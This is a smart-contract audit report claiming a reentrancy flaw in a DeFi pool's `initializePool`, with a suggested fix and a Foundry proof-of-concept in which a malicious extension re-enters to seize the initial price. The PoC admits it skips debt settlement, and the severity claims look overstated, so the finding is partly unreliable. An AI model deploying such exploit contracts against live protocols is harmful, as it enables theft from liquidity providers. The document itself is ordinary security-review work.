## Title
Reentrancy in `initializePool` Allows Malicious Extensions to Front-Run Initialization and Control Initial Tick

## Summary
The `initializePool` function lacks reentrancy protection and calls the extension's `beforeInitializePool` hook before checking if the pool is already initialized. A malicious extension can exploit this by reentrantly calling `initializePool` with a different tick during the callback, initializing the pool at its preferred price, creating positions at that tick, and causing the original caller's transaction to revert.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Core.sol` (function `initializePool`, lines 72-101) [1](#0-0) 

**Intended Logic:** The `initializePool` function should allow the first caller to determine the initial tick/price for a new pool. The `beforeInitializePool` hook is intended for extensions to validate pool configuration and initialize extension-specific state before the pool is created.

**Actual Logic:** The function calls the extension hook at line 83 BEFORE checking if the pool is already initialized at line 88. This creates a reentrancy window where a malicious extension can:
1. Acquire a lock during the `beforeInitializePool` callback
2. Recursively call `initializePool` with a different tick
3. Create positions at that tick (requiring a lock)
4. Return, causing the original caller's transaction to revert with `PoolAlreadyInitialized` [2](#0-1) 

The self-call prevention in `ExtensionCallPointsLib` (line 21) only prevents infinite recursion of the hook itself by checking `iszero(eq(initializer, extension))`, but does NOT prevent the extension from reentrantly calling `initializePool` - it simply skips calling the hook again in the recursive call. [3](#0-2) 

The `updatePosition` function requires a locker (line 365), which the extension can obtain by calling `lock()` during its callback. [4](#0-3) 

The `lock()` function is publicly accessible and allows any contract to acquire a locker, enabling the extension to call `updatePosition` during the reentrancy.

**Exploitation Path:**
1. User calls `Core.initializePool(poolKey, tick=100)` to initialize a new pool at tick 100
2. Core validates the pool key and calls `extension.beforeInitializePool(user, poolKey, tick=100)` at line 83
3. Malicious extension in its `beforeInitializePool` callback:
   - Observes the user wants tick=100
   - Calls `CORE.lock(encodedData)` to acquire a locker
   - In the `locked_6416899205` callback:
     * Calls `CORE.initializePool(poolKey, tick=200)` with a more favorable tick
     * This recursive call reaches line 83, but `shouldCallBeforeInitializePool(extension, extension)` returns false, so it skips the hook
     * Recursive call passes the `isInitialized()` check (pool not yet initialized)
     * Pool gets initialized with tick=200 at line 91
     * Extension calls `CORE.updatePosition(poolKey, positionId, liquidityDelta)` to create a position at tick=200
     * Settles debts and returns from lock
   - Returns from `beforeInitializePool`
4. Original call resumes at line 86 and checks `if (state.isInitialized())` at line 88
5. Pool IS now initialized → reverts with `PoolAlreadyInitialized`

**Security Property Broken:** This violates the fundamental protocol invariant that the first caller to `initializePool` determines the initial tick/price. It also violates the Extension Isolation invariant, as the extension can manipulate core protocol state in an unintended way.

## Impact Explanation
- **Affected Assets**: All pools with malicious extensions. The extension gains unauthorized control over:
  - Initial pool price (tick/sqrtRatio)
  - First-mover advantage on position creation
  - Potential arbitrage opportunities if the forced tick creates price discrepancies with other pools
  
- **Damage Severity**: 
  - Extension can initialize ALL pools at prices favorable to itself, potentially extracting significant value through arbitrage
  - Users attempting to initialize pools will have transactions revert, preventing legitimate pool creation
  - Extension can accumulate first positions at artificially favorable prices before any other LPs can participate
  
- **User Impact**: 
  - Any user attempting to initialize a pool with a malicious extension will fail
  - Market makers and arbitrageurs lose the ability to set fair initial prices
  - LPs are exposed to IL from suboptimal initial prices set by the extension

## Likelihood Explanation
- **Attacker Profile**: Any registered extension contract with the `beforeInitializePool` hook enabled. This includes in-scope extensions like MEVCapture and Oracle if they are modified maliciously, or any third-party extension.

- **Preconditions**: 
  - Extension must be registered with the Core contract
  - Extension must have the `beforeInitializePool` call point enabled (bit 0 set in address)
  - Pool must not yet be initialized
  
- **Execution Complexity**: Single transaction. The attack executes entirely within the `beforeInitializePool` callback through reentrancy.

- **Frequency**: Once per pool. After the first initialization, the pool state check at line 88 prevents further initialization attempts. However, the attacker can exploit this for EVERY new pool created with their extension.

## Recommendation

Add a reentrancy guard to `initializePool` to prevent reentrant calls during extension callbacks:

```solidity
// In src/Core.sol, function initializePool, add reentrancy protection:

// CURRENT (vulnerable):
function initializePool(PoolKey memory poolKey, int32 tick) external returns (SqrtRatio sqrtRatio) {
    poolKey.validate();

    address extension = poolKey.config.extension();
    if (extension != address(0)) {
        StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(extension);

        if (isExtensionRegisteredSlot.load() == bytes32(0)) {
            revert ExtensionNotRegistered();
        }

        IExtension(extension).maybeCallBeforeInitializePool(msg.sender, poolKey, tick);
    }

    PoolId poolId = poolKey.toPoolId();
    PoolState state = readPoolState(poolId);
    if (state.isInitialized()) revert PoolAlreadyInitialized();
    // ... rest of function

// FIXED:
function initializePool(PoolKey memory poolKey, int32 tick) external returns (SqrtRatio sqrtRatio) {
    poolKey.validate();

    PoolId poolId = poolKey.toPoolId();
    PoolState state = readPoolState(poolId);
    
    // CHECK: Pool must not be initialized - MOVED BEFORE extension callback
    if (state.isInitialized()) revert PoolAlreadyInitialized();
    
    // LOCK: Mark pool as "initializing" to prevent reentrancy
    // Use a temporary sentinel value that's neither zero nor a valid pool state
    writePoolState(poolId, PoolState.wrap(bytes32(uint256(1))));

    address extension = poolKey.config.extension();
    if (extension != address(0)) {
        StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(extension);

        if (isExtensionRegisteredSlot.load() == bytes32(0)) {
            revert ExtensionNotRegistered();
        }

        IExtension(extension).maybeCallBeforeInitializePool(msg.sender, poolKey, tick);
    }

    // Now write the actual pool state
    sqrtRatio = tickToSqrtRatio(tick);
    writePoolState(poolId, createPoolState({_sqrtRatio: sqrtRatio, _tick: tick, _liquidity: 0}));
    // ... rest of function
```

**Alternative mitigation:** Move the `isInitialized()` check before the extension callback, but this still allows reentrancy - the extension could initialize other pools. The sentinel value approach is more robust.

## Proof of Concept

```solidity
// File: test/Exploit_ReentrancyInitialize.t.sol
// Run with: forge test --match-test test_ReentrancyInitialize -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/interfaces/ICore.sol";
import "../src/base/BaseExtension.sol";
import "../src/base/BaseLocker.sol";
import "../src/types/poolKey.sol";
import "../src/types/positionId.sol";

// Malicious extension that front-runs initialization
contract MaliciousExtension is BaseExtension, BaseLocker {
    int32 public preferredTick;
    bool public hasReentered;
    
    constructor(ICore core) BaseExtension(core) BaseLocker(core) {}
    
    function getCallPoints() internal pure override returns (CallPoints memory) {
        return CallPoints({
            beforeInitializePool: true,
            afterInitializePool: false,
            beforeSwap: false,
            afterSwap: false,
            beforeUpdatePosition: false,
            afterUpdatePosition: false,
            beforeCollectFees: false,
            afterCollectFees: false
        });
    }
    
    function setPreferredTick(int32 _tick) external {
        preferredTick = _tick;
    }
    
    function beforeInitializePool(address, PoolKey memory poolKey, int32 userTick) 
        external 
        override(BaseExtension, IExtension) 
        onlyCore 
    {
        // If user's tick is not what we want, reenter to initialize at our preferred tick
        if (!hasReentered && userTick != preferredTick) {
            hasReentered = true;
            
            // Acquire lock and initialize pool at our preferred tick
            lock(abi.encode(poolKey, preferredTick));
        }
    }
    
    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        (PoolKey memory poolKey, int32 tick) = abi.decode(data, (PoolKey, int32));
        
        // Reentrantly initialize pool at our preferred tick
        CORE.initializePool(poolKey, tick);
        
        // Create position at our favorable tick
        PositionId positionId = createPositionId({
            _salt: bytes24(0),
            _tickLower: tick - 100,
            _tickUpper: tick + 100
        });
        
        CORE.updatePosition(poolKey, positionId, 1000e18);
        
        // Settle debts (simplified - would need actual token transfers)
        return "";
    }
}

contract Exploit_ReentrancyInitialize is Test {
    Core core;
    MaliciousExtension extension;
    
    function setUp() public {
        core = new Core();
        extension = new MaliciousExtension(core);
        
        // Register extension
        CallPoints memory cp = CallPoints({
            beforeInitializePool: true,
            afterInitializePool: false,
            beforeSwap: false,
            afterSwap: false,
            beforeUpdatePosition: false,
            afterUpdatePosition: false,
            beforeCollectFees: false,
            afterCollectFees: false
        });
        
        vm.prank(address(extension));
        core.registerExtension(cp);
    }
    
    function test_ReentrancyInitialize() public {
        // Extension wants tick=200, user wants tick=100
        extension.setPreferredTick(200);
        
        PoolKey memory poolKey = PoolKey({
            token0: address(0x1),
            token1: address(0x2),
            config: PoolConfig.wrap(bytes32(uint256(uint160(address(extension)))))
        });
        
        // User tries to initialize at tick=100
        vm.expectRevert(ICore.PoolAlreadyInitialized.selector);
        core.initializePool(poolKey, 100);
        
        // Verify pool was initialized at extension's preferred tick=200, not user's tick=100
        PoolState state = core.poolState(poolKey.toPoolId());
        assertEq(state.tick(), 200, "Extension successfully front-ran initialization");
        assertTrue(state.isInitialized(), "Pool was initialized by extension");
    }
}
```

**Notes:**
- This vulnerability allows malicious extensions to completely control pool initialization, violating the permissionless initialization guarantee
- The attack is deterministic and executes in a single transaction
- Moving the `isInitialized()` check before the callback (line 88 → before line 83) would prevent this specific attack
- However, a more robust solution uses a reentrancy guard or sentinel value to prevent ANY reentrant initialization attempts during the callback execution

### Citations

**File:** src/Core.sol (L72-101)
```text
    function initializePool(PoolKey memory poolKey, int32 tick) external returns (SqrtRatio sqrtRatio) {
        poolKey.validate();

        address extension = poolKey.config.extension();
        if (extension != address(0)) {
            StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(extension);

            if (isExtensionRegisteredSlot.load() == bytes32(0)) {
                revert ExtensionNotRegistered();
            }

            IExtension(extension).maybeCallBeforeInitializePool(msg.sender, poolKey, tick);
        }

        PoolId poolId = poolKey.toPoolId();
        PoolState state = readPoolState(poolId);
        if (state.isInitialized()) revert PoolAlreadyInitialized();

        sqrtRatio = tickToSqrtRatio(tick);
        writePoolState(poolId, createPoolState({_sqrtRatio: sqrtRatio, _tick: tick, _liquidity: 0}));

        // initialize these slots so the first swap or deposit on the pool is the same cost as any other swap
        StorageSlot fplSlot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
        fplSlot0.store(bytes32(uint256(1)));
        fplSlot0.next().store(bytes32(uint256(1)));

        emit PoolInitialized(poolId, poolKey, tick, sqrtRatio);

        IExtension(extension).maybeCallAfterInitializePool(msg.sender, poolKey, tick, sqrtRatio);
    }
```

**File:** src/Core.sol (L358-448)
```text
    function updatePosition(PoolKey memory poolKey, PositionId positionId, int128 liquidityDelta)
        external
        payable
        returns (PoolBalanceUpdate balanceUpdate)
    {
        positionId.validate(poolKey.config);

        Locker locker = _requireLocker();

        IExtension(poolKey.config.extension())
            .maybeCallBeforeUpdatePosition(locker, poolKey, positionId, liquidityDelta);

        PoolId poolId = poolKey.toPoolId();
        PoolState state = readPoolState(poolId);
        if (!state.isInitialized()) revert PoolNotInitialized();

        if (liquidityDelta != 0) {
            (SqrtRatio sqrtRatioLower, SqrtRatio sqrtRatioUpper) =
                (tickToSqrtRatio(positionId.tickLower()), tickToSqrtRatio(positionId.tickUpper()));

            (int128 delta0, int128 delta1) =
                liquidityDeltaToAmountDelta(state.sqrtRatio(), liquidityDelta, sqrtRatioLower, sqrtRatioUpper);

            StorageSlot positionSlot = CoreStorageLayout.poolPositionsSlot(poolId, locker.addr(), positionId);
            Position storage position;
            assembly ("memory-safe") {
                position.slot := positionSlot
            }

            uint128 liquidityNext = addLiquidityDelta(position.liquidity, liquidityDelta);

            FeesPerLiquidity memory feesPerLiquidityInside;

            if (poolKey.config.isConcentrated()) {
                // the position is fully withdrawn
                if (liquidityNext == 0) {
                    // we need to fetch it before the tick fees per liquidity outside is deleted
                    feesPerLiquidityInside = _getPoolFeesPerLiquidityInside(
                        poolId, state.tick(), positionId.tickLower(), positionId.tickUpper()
                    );
                }

                _updateTick(poolId, positionId.tickLower(), poolKey.config, liquidityDelta, false);
                _updateTick(poolId, positionId.tickUpper(), poolKey.config, liquidityDelta, true);

                if (liquidityNext != 0) {
                    feesPerLiquidityInside = _getPoolFeesPerLiquidityInside(
                        poolId, state.tick(), positionId.tickLower(), positionId.tickUpper()
                    );
                }

                if (state.tick() >= positionId.tickLower() && state.tick() < positionId.tickUpper()) {
                    state = createPoolState({
                        _sqrtRatio: state.sqrtRatio(),
                        _tick: state.tick(),
                        _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                    });
                    writePoolState(poolId, state);
                }
            } else {
                // we store the active liquidity in the liquidity slot for stableswap pools
                state = createPoolState({
                    _sqrtRatio: state.sqrtRatio(),
                    _tick: state.tick(),
                    _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                });
                writePoolState(poolId, state);
                StorageSlot fplFirstSlot = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
                feesPerLiquidityInside.value0 = uint256(fplFirstSlot.load());
                feesPerLiquidityInside.value1 = uint256(fplFirstSlot.next().load());
            }

            if (liquidityNext == 0) {
                position.liquidity = 0;
                position.feesPerLiquidityInsideLast = FeesPerLiquidity(0, 0);
            } else {
                (uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
                position.liquidity = liquidityNext;
                position.feesPerLiquidityInsideLast =
                    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));
            }

            _updatePairDebtWithNative(locker.id(), poolKey.token0, poolKey.token1, delta0, delta1);

            balanceUpdate = createPoolBalanceUpdate(delta0, delta1);
            emit PositionUpdated(locker.addr(), poolId, positionId, liquidityDelta, balanceUpdate, state);
        }

        IExtension(poolKey.config.extension())
            .maybeCallAfterUpdatePosition(locker, poolKey, positionId, liquidityDelta, balanceUpdate, state);
    }
```

**File:** src/libraries/ExtensionCallPointsLib.sol (L15-47)
```text
    function shouldCallBeforeInitializePool(IExtension extension, address initializer)
        internal
        pure
        returns (bool yes)
    {
        assembly ("memory-safe") {
            yes := and(shr(152, extension), iszero(eq(initializer, extension)))
        }
    }

    function maybeCallBeforeInitializePool(
        IExtension extension,
        address initializer,
        PoolKey memory poolKey,
        int32 tick
    ) internal {
        bool needCall = shouldCallBeforeInitializePool(extension, initializer);
        assembly ("memory-safe") {
            if needCall {
                let freeMem := mload(0x40)
                // cast sig "beforeInitializePool(address, (address, address, bytes32), int32)"
                mstore(freeMem, shl(224, 0x1fbbb462))
                mstore(add(freeMem, 4), initializer)
                mcopy(add(freeMem, 36), poolKey, 96)
                mstore(add(freeMem, 132), tick)
                // bubbles up the revert
                if iszero(call(gas(), extension, 0, freeMem, 164, 0, 0)) {
                    returndatacopy(freeMem, 0, returndatasize())
                    revert(freeMem, returndatasize())
                }
            }
        }
    }
```

**File:** src/base/FlashAccountant.sol (L146-187)
```text
    function lock() external {
        assembly ("memory-safe") {
            let current := tload(_CURRENT_LOCKER_SLOT)

            let id := shr(160, current)

            // store the count
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, add(id, 1)), caller()))

            let free := mload(0x40)
            // Prepare call to locked_(uint256) -> selector 0
            mstore(free, 0)
            mstore(add(free, 4), id) // ID argument

            calldatacopy(add(free, 36), 4, sub(calldatasize(), 4))

            // Call the original caller with the packed data
            let success := call(gas(), caller(), 0, free, add(calldatasize(), 32), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            // Undo the "locker" state changes
            tstore(_CURRENT_LOCKER_SLOT, current)

            // Check if something is nonzero
            let nonzeroDebtCount := tload(add(_NONZERO_DEBT_COUNT_OFFSET, id))
            if nonzeroDebtCount {
                // cast sig "DebtsNotZeroed(uint256)"
                mstore(0x00, 0x9731ba37)
                mstore(0x20, id)
                revert(0x1c, 0x24)
            }

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```
